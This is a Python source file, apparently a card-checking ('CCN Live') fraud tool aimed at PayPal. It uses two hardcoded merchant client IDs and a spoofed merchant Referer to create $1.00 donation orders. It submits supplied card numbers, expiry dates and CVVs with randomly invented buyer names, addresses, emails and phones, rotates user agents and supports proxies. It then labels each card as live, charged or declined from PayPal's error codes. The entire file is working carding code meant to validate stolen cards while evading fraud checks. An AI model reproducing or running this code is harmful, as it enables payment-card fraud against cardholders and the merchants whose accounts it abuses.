import httpx
import asyncio
import random
import string
import json
import time
import re
import base64
import os
import logging

logger = logging.getLogger("paypal_key")

PAYPAL_GQL = "https://www.paypal.com/graphql"

CLIENT_IDS = [
    "AfYeuCj92sbPPTL2FuYr8N_ulfVREcOmZNj8QWjHEoQdSerTUiIvUwq3k8BsJE-eQISIvXo3NvR5NBEO",
    "ARYdv_vDNM2i4bIIp6AsnT7nBcSukYDLI-ghgbbh-1V-98FvyTv4DrIMHi-JRoixTKv321rsjVFyTaMf",
]

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

GQL_MUTATION = """
    mutation payWithCard(
        $token: String!
        $card: CardInput!
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $billingAddress: AddressInput
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            billingAddress: $billingAddress
            currencyConversionType: $currencyConversionType
        ) {
            flags {
                is3DSecureRequired
            }
            cart {
                intent
                cartId
                amounts {
                    total {
                        currencyCode
                        currencyFormatSymbolISOCurrency
                        currencyValue
                    }
                }
                buyer {
                    userId
                    auth {
                        accessToken
                    }
                }
                returnUrl {
                    href
                }
            }
            paymentContingencies {
                threeDomainSecure {
                    status
                    method
                    redirectUrl {
                        href
                    }
                    parameter
                }
            }
        }
    }
"""

LIVE_CODES = {
    "INSUFFICIENT_FUNDS", "CVV2_FAILURE", "INVALID_SECURITY_CODE",
    "INVALID SECURITY CODE", "CVV_MISMATCH", "AVS_FAILURE",
    "CARD_VELOCITY_EXCEEDED", "EXCEEDS_AMOUNT_LIMIT",
    "TRANSACTION_REFUSED",
}

DECLINE_CODES = {
    "DO_NOT_HONOR", "ACCOUNT_CLOSED", "PAYER_ACCOUNT_LOCKED_OR_CLOSED",
    "LOST_OR_STOLEN", "SUSPECTED_FRAUD", "INVALID_ACCOUNT",
    "REATTEMPT_NOT_PERMITTED", "ACCOUNT_BLOCKED_BY_ISSUER",
    "ORDER_NOT_APPROVED", "EXISTING_ACCOUNT_RESTRICTED",
    "GENERIC_DECLINE", "PROCESSOR_DECLINED", "ISSUER_DECLINE",
    "CARD_GENERIC_ERROR", "INVALID_BILLING_ADDRESS",
    "OAS_VALIDATION_ERROR", "OAS_GENERIC_ERROR",
}


def _uid():
    return "uid_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))


def _random_name():
    first = ["James", "John", "Michael", "William", "David", "Robert", "Thomas",
             "Charles", "Chris", "Daniel", "Matthew", "Anthony", "Joseph", "Andrew"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
            "Davis", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Martin"]
    return random.choice(first), random.choice(last)


def _random_address():
    data = [
        ("123 Main St", "New York", "NY", "10001"),
        ("456 Oak Ave", "Los Angeles", "CA", "90001"),
        ("789 Pine Rd", "Chicago", "IL", "60601"),
        ("321 Elm St", "Houston", "TX", "77001"),
        ("654 Maple Dr", "Phoenix", "AZ", "85001"),
        ("111 Cedar Ln", "Seattle", "WA", "98101"),
        ("222 Birch Ct", "Denver", "CO", "80201"),
        ("333 Walnut Way", "Atlanta", "GA", "30301"),
        ("444 Spruce Blvd", "Miami", "FL", "33101"),
        ("555 Ash Pl", "Boston", "MA", "02101"),
    ]
    return random.choice(data)


def _random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"


def _build_sdk_meta(client_id):
    uid = _uid()
    meta = {
        "url": f"https://www.paypal.com/sdk/js?client-id={client_id}&currency=USD",
        "attrs": {
            "data-sdk-integration-source": "button-factory",
            "data-uid": uid,
        }
    }
    return base64.urlsafe_b64encode(json.dumps(meta, separators=(',', ':')).encode()).decode().rstrip('=')


def _classify(result_json, result_text):
    txt = json.dumps(result_json).upper() if result_json else result_text.upper()

    data = result_json.get("data", {}) if result_json else {}
    approve = data.get("approveGuestPaymentWithCreditCard")

    if approve is not None:
        flags = approve.get("flags", {}) or {}
        cart = approve.get("cart", {}) or {}
        intent = (cart.get("intent") or "").upper()
        cart_id = cart.get("cartId", "")

        amounts = cart.get("amounts", {}) or {}
        total = amounts.get("total", {}) or {}
        currency = total.get("currencyCode", "")
        amount = total.get("currencyValue", "")
        formatted = (total.get("currencyFormatSymbolISOCurrency") or "").replace("\u00a0", " ").strip()

        contingencies = approve.get("paymentContingencies", {}) or {}
        tds = contingencies.get("threeDomainSecure", {}) or {}
        tds_status = tds.get("status", "")

        if flags.get("is3DSecureRequired"):
            parts = ["3DS Required (CCN Live)"]
            if formatted:
                parts.append(formatted)
            if cart_id:
                parts.append(f"Order #{cart_id}")
            return "Approved", " | ".join(parts)

        parts = []
        if intent == "CAPTURE":
            parts.append("Payment Captured Successfully")
            if formatted:
                parts.append(formatted)
            elif amount and currency:
                parts.append(f"${amount} {currency}")
            if cart_id:
                parts.append(f"Order #{cart_id}")
            return "Charged", " | ".join(parts)
        elif intent == "SALE":
            parts.append("Payment Successful")
            if formatted:
                parts.append(formatted)
            elif amount and currency:
                parts.append(f"${amount} {currency}")
            if cart_id:
                parts.append(f"Order #{cart_id}")
            return "Charged", " | ".join(parts)
        elif intent == "AUTHORIZE":
            parts.append("Payment Authorized Successfully")
        else:
            parts.append("Payment Approved")

        if formatted:
            parts.append(formatted)
        elif amount and currency:
            parts.append(f"${amount} {currency}")

        if cart_id:
            parts.append(f"Order #{cart_id}")

        return "Approved", " | ".join(parts)

    errors = result_json.get("errors", []) if result_json else []

    for err in errors:
        msg = err.get("message", "")
        err_data = err.get("data", [])

        codes_found = []
        if isinstance(err_data, list):
            for d in err_data:
                code = d.get("code", "")
                if code:
                    codes_found.append(code)

        for code in codes_found:
            if code in LIVE_CODES:
                return "Approved", f"CCN Live - {code}"
            if code in DECLINE_CODES:
                return "Declined", code

        details = err.get("details", [])
        if isinstance(details, list):
            for d in details:
                issue = d.get("issue", "")
                desc = d.get("description", "")
                if issue:
                    if issue.upper() in LIVE_CODES:
                        return "Approved", f"CCN Live - {issue}"
                    detail = f"{issue}"
                    if desc:
                        detail += f" - {desc[:60]}"
                    return "Declined", detail

        if msg:
            msg_upper = msg.upper()
            for lc in LIVE_CODES:
                if lc in msg_upper:
                    return "Approved", f"CCN Live - {msg}"
            for dc in DECLINE_CODES:
                if dc in msg_upper:
                    return "Declined", msg
            return "Declined", msg

    if "EXPIRED" in txt:
        return "Declined", "Expired Card"
    if "INVALID_CARD_NUMBER" in txt:
        return "Declined", "Invalid Card Number"

    return "Declined", "Unknown Response"


async def paypal_key_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_date = f"{mm}/20{yy}"
    else:
        exp_date = f"{mm}/{yy}"
    mm = mm.zfill(2)

    # Small startup jitter (0–1.5s) to spread concurrent requests across users
    # so they don't all hammer PayPal at the exact same millisecond
    await asyncio.sleep(random.uniform(0, 1.5))

    async def _attempt():
        """One full PayPal Keybase attempt — called up to 2 times on timeout."""
        first, last = _random_name()
        street, city, state, zipcode = _random_address()
        email = _random_email()
        phone = "1" + "".join(random.choices(string.digits, k=10))
        ua = random.choice(UA_LIST)

        client_id = random.choice(CLIENT_IDS)
        sdk_meta = _build_sdk_meta(client_id)

        session_id = _uid()
        btn_session_id = _uid()
        corr_id = ''.join(random.choices(string.hexdigits[:16], k=13))

        client_kwargs = dict(
            timeout=httpx.Timeout(30),
            follow_redirects=True,
            headers={"User-Agent": ua},
        )
        if proxy:
            client_kwargs["proxy"] = proxy

        async with httpx.AsyncClient(**client_kwargs) as client:
            buttons_url = (
                f"https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical"
                f"&style.color=gold&style.shape=rect&style.tagline=false"
                f"&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US"
                f"&sdkMeta={sdk_meta}"
                f"&clientID={client_id}"
                f"&sdkCorrelationID={corr_id}"
                f"&sessionID={session_id}"
                f"&buttonSessionID={btn_session_id}"
                f"&env=production&buttonSize=medium"
            )

            r1 = await client.get(
                buttons_url,
                headers={
                    "Host": "www.paypal.com",
                    "Referer": "https://switchupcb.com/",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                },
            )

            if r1.status_code != 200:
                elapsed = round(time.time() - start, 2)
                return f"Error - PayPal buttons failed ({r1.status_code}) [{elapsed}s]"

            tok_match = re.search(r'facilitatorAccessToken":"([^"]+)"', r1.text)
            if not tok_match:
                elapsed = round(time.time() - start, 2)
                return f"Error - No facilitator token [{elapsed}s]"
            token = tok_match.group(1)

            order_payload = {
                "purchase_units": [{
                    "amount": {
                        "currency_code": "USD",
                        "value": "1.00",
                    },
                }],
                "intent": "CAPTURE",
                "application_context": {
                    "shipping_preference": "NO_SHIPPING",
                },
            }

            r2 = await client.post(
                "https://www.paypal.com/v2/checkout/orders",
                json=order_payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {token}",
                    "Referer": buttons_url,
                },
            )

            if r2.status_code not in (200, 201):
                elapsed = round(time.time() - start, 2)
                return f"Error - Order creation failed ({r2.status_code}) [{elapsed}s]"

            order_data = r2.json()
            order_id = order_data.get("id", "")
            if not order_id:
                elapsed = round(time.time() - start, 2)
                return f"Error - No order ID [{elapsed}s]"

            gql_headers = {
                "Content-Type": "application/json",
                "Origin": "https://www.paypal.com",
                "User-Agent": ua,
                "x-app-name": "smart-payment-buttons",
                "paypal-client-context": order_id,
            }

            update_config = {
                "query": """
                    mutation UpdateClientConfig(
                        $orderID: String!,
                        $fundingSource: ButtonFundingSourceType!,
                        $integrationArtifact: IntegrationArtifactType!,
                        $userExperienceFlow: UserExperienceFlowType!,
                        $productFlow: ProductFlowType!,
                        $buttonSessionID: String
                    ) {
                        updateClientConfig(
                            token: $orderID,
                            fundingSource: $fundingSource,
                            integrationArtifact: $integrationArtifact,
                            userExperienceFlow: $userExperienceFlow,
                            productFlow: $productFlow,
                            buttonSessionID: $buttonSessionID
                        )
                    }
                """,
                "variables": {
                    "orderID": order_id,
                    "fundingSource": "card",
                    "integrationArtifact": "PAYPAL_JS_SDK",
                    "userExperienceFlow": "INLINE",
                    "productFlow": "SMART_PAYMENT_BUTTONS",
                    "buttonSessionID": btn_session_id,
                },
            }

            await client.post(
                f"{PAYPAL_GQL}?UpdateClientConfig",
                headers=gql_headers,
                json=update_config,
            )

            card_headers = {
                "Content-Type": "application/json",
                "Origin": "https://www.paypal.com",
                "Referer": "https://www.paypal.com/",
                "User-Agent": ua,
                "paypal-client-metadata-id": order_id,
                "paypal-client-context": order_id,
                "x-app-name": "standardcardfields",
            }

            gql_payload = {
                "query": GQL_MUTATION,
                "variables": {
                    "token": order_id,
                    "card": {
                        "cardNumber": cc,
                        "expirationDate": exp_date,
                        "securityCode": cvv,
                        "postalCode": zipcode,
                    },
                    "phoneNumber": phone,
                    "firstName": first,
                    "lastName": last,
                    "billingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": street,
                        "line2": None,
                        "city": city,
                        "state": state,
                        "postalCode": zipcode,
                        "country": "US",
                    },
                    "email": email,
                    "currencyConversionType": "PAYPAL",
                },
                "operationName": "payWithCard",
            }

            r3 = await client.post(
                f"{PAYPAL_GQL}?fetch_credit_form_submit",
                headers=card_headers,
                json=gql_payload,
            )

            elapsed = round(time.time() - start, 2)

            try:
                result_json = r3.json()
            except Exception:
                if "<html" in r3.text.lower():
                    return f"Declined - Auth Challenge [{elapsed}s]"
                return f"Error - Invalid response [{elapsed}s]"

            status, message = _classify(result_json, r3.text)
            return f"{status} - {message} | {cc[:6]} [{elapsed}s]"

    # ── Retry loop: 2 attempts total, retry once on timeout ──────────────────
    for attempt in range(2):
        try:
            return await _attempt()
        except (httpx.ConnectTimeout, httpx.ReadTimeout,
                httpx.WriteTimeout, httpx.PoolTimeout):
            if attempt == 0:
                # First timeout — wait 3–6s then retry with a fresh session
                await asyncio.sleep(random.uniform(3, 6))
                continue
            elapsed = round(time.time() - start, 2)
            return f"Error - PayPal Timeout [{elapsed}s]"
        except httpx.NetworkError:
            elapsed = round(time.time() - start, 2)
            return f"Error - Network Error [{elapsed}s]"
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            logger.warning(f"paypal_key error: {e}")
            return f"Error - {str(e)[:80]} [{elapsed}s]"
